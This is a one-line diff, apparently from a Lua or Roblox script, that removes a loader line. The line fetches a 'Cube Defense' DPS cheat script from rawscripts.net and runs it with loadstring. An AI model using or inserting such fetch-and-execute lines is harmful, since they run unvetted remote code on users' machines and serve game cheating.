@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://rawscripts.net/raw/Cube-Defense-Add-DPS-Mod-9929"))()
